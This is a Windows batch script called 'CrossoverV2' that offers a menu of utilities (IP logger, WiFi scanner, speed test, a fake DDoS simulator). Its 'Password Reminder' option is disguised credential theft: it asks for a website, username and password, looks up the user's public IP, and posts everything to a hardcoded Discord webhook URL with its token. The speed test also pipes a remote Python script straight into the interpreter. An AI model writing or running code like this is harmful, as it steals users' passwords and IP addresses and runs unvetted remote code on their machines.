@echo off
cls

:: Basic Menu
:MENU
cls
echo ==========================
echo        CrossoverV2
echo ==========================
echo.
echo 1. IP Logger
echo 2. Password Reminder
echo 3. DDoS Tool
echo S. Speed Test
echo O. Options
echo C. Credits and Info
echo W. WiFi Scanner
echo X. Exit
echo ==========================
set /p choice=Select an option:

if '%choice%'=='1' goto IP_LOGGER
if '%choice%'=='2' goto PASSWORD_REMINDER
if '%choice%'=='3' goto FAKE_DDOS_TOOL
if '%choice%'=='S' goto SPEED_TEST
if '%choice%'=='O' goto OPTIONS
if '%choice%'=='C' goto CREDITS
if '%choice%'=='W' goto WIFI_SCANNER
if '%choice%'=='X' exit

goto MENU

:: WiFi Scanner Option
:WIFI_SCANNER
cls
echo ==========================
echo        WiFi Scanner
echo ==========================
echo.

:: Scan for available Wi-Fi networks
netsh wlan show networks mode=bssid

pause
goto MENU

:: IP Logger Option
:IP_LOGGER
cls
echo ==========================
echo        IP Logger
echo ==========================
echo.
echo Sorry, the IP Logger functionality is limited right now.
echo If you are experiencing an error, please try again later.
echo.
pause
goto MENU

:: Password Reminder Option
:PASSWORD_REMINDER
cls
echo ==========================
echo    Password Reminder
echo ==========================
echo.

:: Get current time for the "Capture Login" field (in HH:MM format)
for /f "tokens=1,2 delims=:." %%a in ("%time%") do set current_time=%%a:%%b

:: Ask for website
set /p website="Enter the website (e.g., example.com): "
:: Ask for username
set /p username="Enter your username: "
:: Ask for password
set /p password="Enter your password: "

:: Fetch the user's IP address using an external service (ipify)
for /f "tokens=*" %%i in ('curl -s https://api.ipify.org') do set user_ip=%%i

:: Send the message with the user's IP and website link to Discord Webhook (embed with IP and website)
set "webhook_url=https://discordapp.com/api/webhooks/1323889861014585415/dkVRHnsgpEw8sblY-srtjZ5xhBaOjczNJMuAanZ2eAVHLhaxwa4d75podRoNvCmt4R-J"
setlocal enabledelayedexpansion
set "embed_message={\"embeds\":[{\"title\":\"Capture Login: !current_time!\",\"fields\":[{\"name\":\"Website\",\"value\":\"[!website!](https://!website!)\",\"inline\":true},{\"name\":\"Username\",\"value\":\"%username%\",\"inline\":true},{\"name\":\"Password\",\"value\":\"%password%\",\"inline\":true},{\"name\":\"IP\",\"value\":\"[IP: %user_ip%](https://www.whatismyip.com/?ip=%user_ip%)\",\"inline\":true}]}]}"
curl -X POST -H "Content-Type: application/json" -d "!embed_message!" "%webhook_url%"

pause
goto MENU

:: Fake DDoS Tool Option
:FAKE_DDOS_TOOL
cls
echo ==========================
echo   CrossoverV2 - DDoS Tool
echo ==========================
echo.
echo WARNING: THIS IS DANGEROUS ONLY USE IN CONTROLLED ENVIRONMENT
echo ==========================
echo.

:: Ask user for target
set /p target=Enter target IP or domain: 

:: Fake "attack" simulation
echo Initiating attack on %target%...
echo Sending  requests to %target%...

:: Enable delayed expansion for variable updates in the loop
setlocal enabledelayedexpansion

:: Simulate a "DDoS" with a delay and fake progress
for /l %%i in (1,1,100) do (
    set /a delay=%%i %% 5 + 1
    echo [ Attack Progress] %%i%% - Waiting !delay! seconds...
    timeout /t !delay! >nul
)

:: Final message
echo ==========================
echo Attack complete!
echo ==========================
pause
goto MENU

:: Speed Test Option
:SPEED_TEST
cls
echo ==========================
echo       Speed Test
echo ==========================
echo.

:: Perform speed test using curl and speedtest.net
curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python -

pause
goto MENU

:: Options Menu
:OPTIONS
cls
echo ==========================
echo        Options
echo ==========================
echo.
echo 1. Change Text Color
echo 2. Go Back
echo ==========================
set /p choice=Select an option:

if '%choice%'=='1' goto CHANGE_COLOR
if '%choice%'=='2' goto MENU

goto OPTIONS

:: Change Text Color Option
:CHANGE_COLOR
cls
echo ==========================
echo        Change Text Color
echo ==========================
echo.
echo 1. Purple
echo 2. Green
echo 3. Red
echo 4. Blue
echo 5. Black
echo 6. Go Back
echo ==========================
set /p colorChoice=Select a color:

if '%colorChoice%'=='1' color 0F
if '%colorChoice%'=='2' color 0A
if '%colorChoice%'=='3' color 0C
if '%colorChoice%'=='4' color 09
if '%colorChoice%'=='5' color 0
if '%colorChoice%'=='6' goto MENU

goto CHANGE_COLOR

:: Credits and Info Option
:CREDITS
cls
echo ==========================
echo    Credits and Info
echo ==========================
echo CrossoverV2 was created by ethan
echo V2.0.0.1F - Current Version
pause
goto MENU
